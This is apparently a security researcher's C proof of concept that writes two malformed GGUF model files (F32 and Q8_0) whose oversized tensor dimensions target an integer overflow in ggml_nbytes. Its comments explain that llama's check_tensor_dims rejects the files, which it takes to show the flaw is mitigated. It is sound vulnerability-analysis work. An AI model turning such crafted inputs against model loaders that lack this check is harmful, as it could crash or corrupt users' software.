// PoC v2: Malformed GGUF with valid llama hparams + overflow tensor dimensions
// Includes all required KV pairs to pass load_hparams, but tensor dimensions
// don't match expected shapes so check_tensor_dims catches the mismatch.
// This demonstrates why the overflow is unexploitable through the standard path.
//
// Build: gcc -o poc_gguf_v2 poc_gguf_v2.c -lm -Wall
// Run:   ./poc_gguf_v2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define GGUF_MAGIC          "GGUF"
#define GGUF_VERSION        3
#define GGUF_ALIGNMENT      32

enum ggml_type {
    GGML_TYPE_F32 = 0,
    GGML_TYPE_F16 = 1,
    GGML_TYPE_Q8_0 = 8,
};

enum gguf_type {
    GGUF_TYPE_UINT8 = 0, GGUF_TYPE_INT8, GGUF_TYPE_UINT16, GGUF_TYPE_INT16,
    GGUF_TYPE_UINT32, GGUF_TYPE_INT32, GGUF_TYPE_FLOAT32, GGUF_TYPE_BOOL,
    GGUF_TYPE_STRING, GGUF_TYPE_ARRAY, GGUF_TYPE_UINT64, GGUF_TYPE_INT64,
    GGUF_TYPE_FLOAT64, GGUF_TYPE_COUNT,
};

static void write_u32(FILE *f, uint32_t v) { fwrite(&v, 1, 4, f); }
static void write_u64(FILE *f, uint64_t v) { fwrite(&v, 1, 8, f); }
static void write_i32(FILE *f, int32_t v)  { fwrite(&v, 1, 4, f); }
static void write_i64(FILE *f, int64_t v)  { fwrite(&v, 1, 8, f); }
static void write_f32(FILE *f, float v)    { fwrite(&v, 1, 4, f); }

static void write_string(FILE *f, const char *s) {
    uint64_t len = strlen(s);
    write_u64(f, len);
    fwrite(s, 1, len, f);
}

static void pad_to(FILE *f, size_t alignment) {
    long pos = ftell(f);
    size_t pad = (alignment - ((size_t)pos % alignment)) % alignment;
    for (size_t i = 0; i < pad; i++) fputc(0, f);
}

static void write_kv_u32(FILE *f, const char *key, uint32_t val) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_UINT32);
    write_u32(f, val);
}

static void write_kv_f32(FILE *f, const char *key, float val) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_FLOAT32);
    write_f32(f, val);
}

static void write_kv_str(FILE *f, const char *key, const char *val) {
    write_string(f, key);
    write_i32(f, GGUF_TYPE_STRING);
    write_string(f, val);
}

int main() {
    printf("=== Malicious GGUF Generator v2 ===\n");
    printf("  Includes valid llama hparams to pass load_hparams phase\n");
    printf("  Tensor dimensions trigger stride overflow in ggml_nbytes\n\n");

    // === Variant 1: F32 tensor with overflow dimensions ===
    {
        const char *filename = "/tmp/malicious_v2.gguf";
        FILE *f = fopen(filename, "wb");
        if (!f) { perror("fopen"); return 1; }

        printf("Creating: %s\n", filename);

        fwrite(GGUF_MAGIC, 1, 4, f);
        write_u32(f, GGUF_VERSION);
        write_i64(f, 1);  // n_tensors
        write_i64(f, 8);  // n_kv

        // Required llama hparams
        write_kv_str(f, "general.architecture", "llama");
        write_kv_str(f, "general.name", "overflow_test");
        write_kv_u32(f, "llama.block_count", 1);
        write_kv_u32(f, "llama.embedding_length", 64);
        write_kv_u32(f, "llama.context_length", 512);
        write_kv_u32(f, "llama.attention.head_count", 4);
        write_kv_u32(f, "llama.feed_forward_length", 128);
        write_kv_f32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5f);

        // Overflow tensor: ne = {2^31, 2^31, 1, 1}, F32
        // Named like a real llama tensor but dimensions don't match expected {64, n_vocab}
        int64_t ne0 = 1LL << 31;
        int64_t ne1 = 1LL << 31;

        printf("  tensor: token_embd.weight\n");
        printf("  ne={%ld, %ld, 1, 1}, type=F32\n", (long)ne0, (long)ne1);
        printf("  Expected shape: {64, n_vocab} (2D) - MISMATCH!\n");
        printf("  check_tensor_dims will reject this\n");

        write_string(f, "token_embd.weight");
        write_u32(f, 4);
        write_i64(f, ne0);
        write_i64(f, ne1);
        write_i64(f, 1);
        write_i64(f, 1);
        write_i32(f, (int32_t)GGML_TYPE_F32);
        write_u64(f, 0);

        pad_to(f, GGUF_ALIGNMENT);
        for (int i = 0; i < 4; i++) fputc(0, f);
        pad_to(f, GGUF_ALIGNMENT);

        printf("  File size: %ld bytes\n\n", ftell(f));
        fclose(f);
    }

    // === Variant 2: Q8_0 tensor ===
    {
        const char *filename = "/tmp/malicious_q80.gguf";
        FILE *f = fopen(filename, "wb");
        if (!f) { perror("fopen"); return 1; }

        printf("Creating: %s\n", filename);

        fwrite(GGUF_MAGIC, 1, 4, f);
        write_u32(f, GGUF_VERSION);
        write_i64(f, 1);
        write_i64(f, 8);

        write_kv_str(f, "general.architecture", "llama");
        write_kv_str(f, "general.name", "overflow_q80");
        write_kv_u32(f, "llama.block_count", 1);
        write_kv_u32(f, "llama.embedding_length", 64);
        write_kv_u32(f, "llama.context_length", 512);
        write_kv_u32(f, "llama.attention.head_count", 4);
        write_kv_u32(f, "llama.feed_forward_length", 128);
        write_kv_f32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5f);

        write_string(f, "token_embd.weight");
        write_u32(f, 4);
        write_i64(f, 1LL << 31);
        write_i64(f, 1LL << 31);
        write_i64(f, 1);
        write_i64(f, 1);
        write_i32(f, (int32_t)GGML_TYPE_Q8_0);
        write_u64(f, 0);

        pad_to(f, GGUF_ALIGNMENT);
        for (int i = 0; i < 4; i++) fputc(0, f);
        pad_to(f, GGUF_ALIGNMENT);

        printf("  File size: %ld bytes\n\n", ftell(f));
        fclose(f);
    }

    printf("Files created: /tmp/malicious_v2.gguf, /tmp/malicious_q80.gguf\n");
    printf("\nNote: These files include valid llama hparams but will be rejected by\n");
    printf("check_tensor_dims because the tensor dimensions don't match the expected\n");
    printf("shape derived from the hyperparameters. This demonstrates why the overflow\n");
    printf("vulnerability is mitigated by the llama loader's dimension validation.\n");
    return 0;
}
